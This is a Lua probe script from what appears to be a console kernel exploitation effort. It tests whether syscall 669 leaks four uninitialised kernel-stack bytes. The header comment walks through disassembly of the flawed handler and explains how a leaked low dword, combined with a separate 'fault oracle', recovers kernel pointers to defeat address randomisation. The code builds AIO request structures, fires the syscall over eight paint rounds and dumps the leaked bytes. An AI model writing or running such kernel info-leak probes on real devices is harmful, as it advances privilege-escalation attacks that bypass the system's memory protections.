-- CRASH_CLASS: LOW -- AIO batch submit only; 669 has never killed this process
-- PROBE 1369a: is the sys 669 four-byte over-copy a kernel-stack disclosure?
--
-- The 13.60 handler fills a 12-byte stack record and then copies 0x10 bytes out of
-- it (results/kernel_handlers/asm/sys_669_deep.asm):
--
--     3b57c6  mov [rbp-0x88], rcx          ; 8 bytes: the request's position
--     3b57cd  mov eax, [r12+0x38]
--     3b57db  mov [rbp-0x80], eax          ; 4 bytes: the request's status
--     3b57e2  mov rdi, gs:[0x0]
--     3b57eb  call 0xc1a3e0                ; diagnostic printf, fills the frame below
--     3b57f0  mov edx, 0x10
--     3b57f5  lea rdi, [rbp-0x88]
--     3b57fc  mov rsi, r14
--     3b57ff  call 0x2591d0                ; copyout 16 bytes to the request's dest
--
-- so bytes [rbp-0x7c..-0x79] -- the top four bytes of the second qword -- are never
-- written by the fill and are copied to a caller buffer anyway. Whatever sits there
-- belongs to the diagnostic call's frame, which is exactly the kind of slot that
-- holds a saved kernel return address. A four-byte low half is enough for us: the
-- fault oracle gives the image base per boot, so a code/data pointer is recovered by
-- combining a known high dword with a leaked low one.
--
-- The request struct is 0x28 bytes (probes/phase17_new_vectors/355a_aio_class.lua:61):
--   +0x00 file offset, +0x08 byte count, +0x10 destination, +0x18 source, +0x20 fd
-- and the call is 669(cmd=1 read, reqs, count, class, ids).
--
-- Each round repaints the destination with a different pattern, so a value that
-- follows the paint is a stale user byte and a value that does not is kernel data.
--
-- -- prior art:
--   results/kernel_handlers/asm/sys_669_deep.asm (leak site 0x3b57c6..0x3b57ff)
--   results/kernel_handlers/asm/sys_670_deep.asm (byte-identical at 0x2939/0x2969)
--   probes/phase17_new_vectors/355a_aio_class.lua (request layout, class sweep)
--   docs/AIO_BATCH_14_10.md

print("=== PROBE 1369a: SYS 669 FOUR-BYTE OVER-COPY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function wd(addr, val) pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) pcall(function() memory.write_qword(addr, val) end) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local mk = make_syscall
local sc_open = mk(5)
local sc_close = mk(6)

local path = "/app0/eboot.bin"
local name = memory.alloc(0x40)
for i = 0, 0x38, 4 do wd(name + i, 0) end
for i = 1, #path do wd(name + i - 1, string.byte(path, i)) end
local fd = to_num(sc_open(U(0, to_num(name)), U(0, 0), U(0, 0), U(0, 0), U(0, 0), U(0, 0)))
print(string.format("[0] %s -> fd=%d", path, fd))
if fd < 0 then print("=== PROBE 1369a ABORT: no fd ===") return end

local reqs  = memory.alloc(0x100)
local ids   = memory.alloc(0x100)
local dest  = memory.alloc(0x100)
local fills = {0xA5, 0x5A, 0x33, 0xCC, 0x00, 0xFF, 0x77, 0x11}

for r = 1, 8 do
    local fill = fills[r]
    for i = 0, 0xFC, 4 do wd(dest + i, fill) end
    for i = 0, 0xF8, 8 do wq(reqs + i, 0); wq(ids + i, 0) end
    for i = 0, 0xFC, 4 do wd(ids + i, 0) end

    local off = (r - 1) * 0x1000
    wq(reqs + 0x00, U(0, off))              -- file offset
    wq(reqs + 0x08, U(0, 0x10))             -- byte count
    wq(reqs + 0x10, U(0, to_num(dest)))     -- destination (the 0x10-byte copyout)
    wq(reqs + 0x18, U(0, 0))                -- source, unused for a read
    wd(reqs + 0x20, fd)                     -- fd

    local rv = to_num(mk(669)(U(0, 1), U(0, to_num(reqs)), U(0, 1), U(0, 1), U(0, to_num(ids)), U(0, 0)))
    print(string.format("[%d] fill=0x%02X ret=%d", r, fill, rv))
    local line = "    dest:"
    for i = 0, 0x1C, 4 do line = line .. string.format(" %08X", rd(dest + i) or 0) end
    print(line)
    print(string.format("    body[0..12)=%08X %08X %08X   tail[12..16)=%08X",
        rd(dest) or 0, rd(dest + 4) or 0, rd(dest + 8) or 0, rd(dest + 12) or 0))
end

pcall(function() sc_close(U(0, fd), U(0, 0), U(0, 0), U(0, 0), U(0, 0), U(0, 0)) end)
print("=== PROBE 1369a COMPLETE ===")
